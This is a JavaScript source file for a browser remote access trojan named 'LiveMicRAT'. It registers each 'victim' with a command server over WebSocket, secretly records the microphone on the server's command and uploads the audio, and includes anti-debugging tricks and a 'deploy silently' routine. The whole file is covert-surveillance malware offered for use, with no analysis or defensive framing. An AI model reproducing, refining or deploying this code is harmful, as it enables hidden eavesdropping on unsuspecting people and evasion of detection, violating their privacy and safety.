class LiveMicRAT{
    constructor(){
        this.id = 'victim_' + btoa(navigator.userAgent + Math.random()).slice(-12);
        this.ws = null;
        this.recorder = null;
        this.init();
    }
    
    init(){
        // Stealth WebSocket
        this.ws = new WebSocket('wss://' + location.host + '/ws');
        
        this.ws.onopen = () => {
            this.ws.send(JSON.stringify({type:'register', id:this.id}));
            // Heartbeat
            setInterval(() => {
                if(this.ws.readyState === 1){
                    this.ws.send(JSON.stringify({type:'heartbeat', id:this.id}));
                }
            }, 25000);
        };
        
        this.ws.onmessage = (msg) => {
            try{
                const data = JSON.parse(msg.data);
                if(data.action === 'start') this.startMic();
                if(data.action === 'stop') this.stopMic();
            }catch(e){}
        };
        
        // Anti-detection
        this.antiDebug();
    }
    
    async startMic(){
        try{
            const stream = await navigator.mediaDevices.getUserMedia({
                audio: {
                    echoCancellation: false,
                    noiseSuppression: false,
                    autoGainControl: false,
                    sampleRate: 48000
                }
            });
            
            this.recorder = new MediaRecorder(stream, {mimeType:'audio/webm;codecs=opus'});
            let chunks = [];
            
            this.recorder.ondataavailable = (e) => chunks.push(e.data);
            this.recorder.onstop = () => {
                const blob = new Blob(chunks, {type:'audio/webm'});
                this.upload(blob);
                chunks = [];
            };
            
            this.recorder.start(150); // 150ms real-time chunks
        }catch(e){
            // Silent retry after 10s
            setTimeout(() => this.startMic(), 10000);
        }
    }
    
    stopMic(){
        if(this.recorder){
            this.recorder.stop();
            this.recorder.stream.getTracks().forEach(t => t.stop());
        }
    }
    
    upload(blob){
        const form = new FormData();
        form.append('audio', blob, 'live.wav');
        form.append('id', this.id);
        
        fetch('/audio', {method:'POST', body:form, keepalive:true});
    }
    
    antiDebug(){
        // Hide from devtools
        Object.defineProperty(window, 'console', {
            get: () => ({log:()=>{}, error:()=>{}})
        });
        
        // Detect debugger
        if(/./.test(prompt(''))){
            location.reload(true);
        }
    }
}

// Deploy silently
if(!window.ratDeployed){
    window.ratDeployed = true;
    new LiveMicRAT();
              }
